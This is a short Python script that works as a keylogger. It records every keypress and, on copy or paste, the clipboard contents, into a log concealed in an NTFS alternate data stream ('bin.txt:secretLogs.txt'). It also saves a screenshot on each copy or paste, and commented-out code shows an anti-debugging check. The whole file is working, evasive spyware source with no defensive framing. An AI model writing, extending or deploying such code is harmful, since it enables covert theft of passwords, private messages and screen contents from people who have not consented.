import os
from pynput import keyboard
import pyperclip
import pyautogui
# import customDebugDetector


def printKeyPress(key):
    if (key == keyboard.KeyCode(char = '\x03') or key == keyboard.KeyCode(char = '\x16')):
        oldclip = pyperclip.paste() 
        data = pyperclip.paste()
        if oldclip == data:
            try:
                pyperclip.waitForNewPaste(0.1)
            except pyperclip.PyperclipTimeoutException:
                pass
            data = pyperclip.paste()

        with open("bin.txt:secretLogs.txt", mode='a') as f:
            f.write(str(data))
            f.write('\n')
            f.close()

            if os.path.isfile('screenshot'):
                os.remove('screenshot')
            

            screenshot = pyautogui.screenshot()
            screenshot.save('screenshot.png')


        print(data)

    else:
        with open("bin.txt:secretLogs.txt", mode='a') as f:
            f.write(str(key))
            f.write('\n')
            f.close()


# print(customDebugDetector.customChecker())

# if (customDebugDetector.customChecker() != 0):
#     print("Quit early")
# else:
with keyboard.Listener(on_press=printKeyPress) as Listener:
    Listener.join()